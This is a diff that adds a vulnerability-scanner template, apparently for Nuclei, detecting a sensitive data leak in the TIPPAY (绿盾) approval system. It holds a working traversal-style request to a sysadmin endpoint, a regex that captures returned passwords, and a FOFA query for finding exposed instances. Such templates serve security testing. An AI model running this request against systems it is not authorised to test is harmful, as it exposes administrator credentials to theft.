@@ -1,0 +1,31 @@
+id: tippay-sysadmin-info-leak
+info:
+  name: TIPPAY Sensitive Information Disclosure
+  author: bl
+  severity: high
+  description: |
+    The TIPPAY approval system contains a sensitive information disclosure vulnerability, where the sysadmin endpoint leaks sensitive data.
+  metadata:
+    fofa-query: app="TIPPAY-绿盾审批系统"
+  tags: TIPPAY-绿盾审批系统
+http:
+  - raw:
+      - |
+        GET /trwfe/service/../ws/identity/user/sysadmin HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - email
+          - password
+          - pictureUrl
+        condition: and
+      - type: regex
+        part: body
+        regex:
+          - ("password":\s*"[^"]+")
